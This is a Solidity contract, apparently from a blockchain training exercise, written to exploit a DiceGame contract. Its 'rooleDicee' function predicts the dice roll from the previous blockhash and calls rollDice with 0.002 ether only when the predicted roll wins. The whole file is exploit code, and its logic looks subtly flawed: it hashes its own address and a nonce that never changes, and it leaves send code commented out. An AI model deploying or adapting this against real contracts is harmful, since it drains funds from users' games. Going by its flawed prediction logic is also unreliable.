// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "../src/DiceGame.sol";

contract AttackDicegame {
    DiceGame public victimContract;
    uint256 public nonce = 0;
    uint256 public prize = 0;

    constructor(address payable _victimContract) payable {
        require(msg.value >= 0.002 ether);
        victimContract = DiceGame(_victimContract);
    }

    function rooleDicee() public returns (bool) {
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(abi.encodePacked(prevHash, address(this), nonce));
        uint256 roll = uint256(hash) % 16;

        if (roll > 2) {
            return false; // Contract.balance == 0.002 ether
        }
        // uint256 amount = prize;
        // (bool sent,) = address(victimContract).call{value: amount}("");
        // require(sent, "failed to send ether");

        victimContract.rollDice{value: 0.002 ether}();
        return true; // Wining prize
    }

    receive() external payable {}
}
